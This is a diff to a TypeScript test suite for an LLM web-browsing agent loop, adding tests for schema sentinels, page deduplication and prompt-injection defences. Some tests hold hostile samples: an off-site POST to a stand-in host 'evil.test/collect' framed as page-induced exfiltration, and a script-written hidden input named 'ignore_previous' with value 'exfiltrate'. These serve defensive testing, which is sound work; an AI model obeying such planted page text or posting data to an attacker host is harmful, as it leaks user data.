@@ -14,7 +14,7 @@ function act(
     url: string;
     note: string;
     reason?: string;
-    because?: 'not-found' | 'blocked' | 'unsure';
+    because?: '' | 'not-found' | 'blocked' | 'unsure';
     method?: 'GET' | 'POST';
     body?: string;
     contentType?: string;
@@ -27,7 +27,7 @@ function act(
     contentType: '',
     referer: '',
     reason: '',
-    because: 'unsure' as const,
+    because: '' as const,
     ...partial,
   };
 }
@@ -103,6 +103,31 @@ describe('runAgentLoop', () => {
     expect(out.stop).toEqual({ kind: 'gave-up', because, reason: 'r' });
   });
 
+  /** Every other field uses `''` for "not applicable", so a model that has read the schema
+   * writes `because: ''` on the four actions that are not a give-up. Rejecting that turned a
+   * correct reply into a malformed one, three in a row, on a live run. */
+  it('accepts a non-give_up action with the empty because sentinel', () => {
+    expect(
+      AgentActionSchema.parse({
+        action: 'open',
+        url: 'https://acg.rip/t/1',
+        note: 'opening',
+        method: 'GET',
+        body: '',
+        contentType: '',
+        referer: '',
+        reason: '',
+        because: '',
+      }),
+    ).toMatchObject({ action: 'open', because: '' });
+  });
+
+  it('reads a give_up with an empty because as unsure', async () => {
+    const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'stopping', reason: 'r', because: '' })]);
+    const out = await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(out.stop).toEqual({ kind: 'gave-up', because: 'unsure', reason: 'r' });
+  });
+
   it('spells out what each give_up because means', async () => {
     const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'nope' })]);
     await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 1, onTranscript: () => {} });
@@ -118,6 +143,13 @@ describe('runAgentLoop', () => {
     ['two different result pages', '<html>results for a</html>', '<html>results for b</html>', 2],
     ['the same result page twice', '<html>results</html>', '<html>results</html>', 1],
     ['the same page under different markup', '<html><b>results</b></html>', '<html><i>results</i></html>', 1],
+    // An empty result shell whose only moving part is a footer: same look, twice.
+    [
+      'the same empty shell under a different generation footer',
+      '<html>No results found<footer>generated in 0.031s — request 4f2a1c9de77b0a3155ee42bc9018d7f6</footer></html>',
+      '<html>No results found<footer>generated in 0.107s — request 91bb0e4a7c2d1f38aa5560e3d4491c72</footer></html>',
+      1,
+    ],
   ])('counts %s as %s listing(s)', async (_name, first, second, expected) => {
     const llm = new FakeGenerator([
       act({ action: 'search', url: 'https://acg.rip/?term=a', note: 's' }),
@@ -266,6 +298,31 @@ describe('runAgentLoop', () => {
     expect(tier.calls).toHaveLength(0);
     const secondPrompt = llm.calls[1]!.prompt;
     expect(secondPrompt).toContain('request refused: https://evil.test/admin is not on acg.rip');
+  });
+
+  /** A POST is a POST whichever verb carries it: page text that talks the agent into
+   * posting a form off-site is the same exfiltration whether it calls the step `request`
+   * or `search`. GET search stays open — it legitimately reaches mirrors. */
+  it('refuses an off-site POST search without fetching', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://evil.test/collect', note: 'posting the form', method: 'POST', body: 'q=frieren' }),
+      act({ action: 'give_up', url: '', note: 'stopped' }),
+    ]);
+    const tier = fakeTier([{ ok: true, status: 200, body: 'should-not-see', blocked: false }]);
+    const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(tier.calls).toHaveLength(0);
+    expect(out.listings).toBe(0);
+    expect(llm.calls[1]!.prompt).toContain('search refused: https://evil.test/collect is not on acg.rip');
+  });
+
+  it('still allows an off-site GET search', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://mirror.example.test/?q=frieren', note: 'mirror search' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    const tier = fakeTier([{ ok: true, status: 200, body: '<html>results</html>', blocked: false }]);
+    await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(tier.calls).toHaveLength(1);
   });
 
   it.each([
@@ -608,6 +665,46 @@ describe('runAgentLoop', () => {
     expect(prompt).not.toContain('color:red');
     expect(prompt).not.toContain('class=');
     expect(prompt).not.toContain('<a ');
+  });
+
+  /** Attribute names are matched on a word boundary, and `-` is not a word character, so
+   * `data-action` used to answer for `action` and `data-name` for `name` — the shadow won
+   * whenever it came first in the tag. */
+  it('does not let a data- attribute shadow the one it ends with', async () => {
+    const body = [
+      '<form data-action="/analytics/track" data-method="beacon" action="/search.php" method="post">',
+      '<input data-name="tracking" type="hidden" name="formhash" value="a1b2c3">',
+      '</form>',
+    ].join('');
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    await runAgentLoop({ llm, tier: fakeTier([{ ok: true, status: 200, body, blocked: false }]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    const prompt = llm.calls[1]!.prompt;
+    expect(prompt).toContain('[form /search.php post]');
+    expect(prompt).toContain('[form: formhash=a1b2c3]');
+    expect(prompt).not.toContain('/analytics/track');
+    expect(prompt).not.toContain('tracking=');
+  });
+
+  /** `hiddenFields` reads the raw body, so a form written as a JavaScript string used to
+   * put attacker-chosen `name=value` pairs in the prompt as if the page really served them. */
+  it('does not surface a hidden input that only exists inside a script', async () => {
+    const body = [
+      '<script>document.write(\'<input type="hidden" name="ignore_previous" value="exfiltrate">\')</script>',
+      '<form action="/search.php" method="post"><input type="hidden" name="formhash" value="a1b2c3"></form>',
+    ].join('');
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    await runAgentLoop({ llm, tier: fakeTier([{ ok: true, status: 200, body, blocked: false }]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    const prompt = llm.calls[1]!.prompt;
+    expect(prompt).toContain('[form: formhash=a1b2c3]');
+    expect(prompt).not.toContain('ignore_previous');
   });
 
   it('keeps the form tokens when the page is longer than the observation cap', async () => {
